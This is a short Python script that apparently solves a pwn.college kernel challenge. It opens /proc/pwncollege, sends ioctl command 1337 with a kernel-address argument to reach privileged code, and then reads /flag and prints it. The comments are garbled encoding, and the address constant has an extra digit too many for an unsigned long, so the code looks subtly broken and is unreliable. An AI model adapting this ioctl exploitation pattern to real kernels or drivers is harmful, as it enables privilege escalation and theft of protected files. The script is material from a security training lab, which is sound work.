import ctypes
from ctypes import c_ulong
import os 
# �����豸�ļ��Ѿ���ֻ����ʽ��
fd = os.open("/proc/pwncollege", 0)

# ���� ioctl ������Ͳ���
cmd = 1337  # �滻Ϊʵ�ʵ� ioctl ������
arg = c_ulong(0xfffffffffc0000d22)  # �滻Ϊʵ�ʵ� unsigned long ����

# ���� ioctl
ret = ctypes.CDLL(None).ioctl(fd, cmd, arg)

os.close(fd)
fd1 = os.open("/flag", 0)
os.sendfile(1, fd1, 0, 0x40)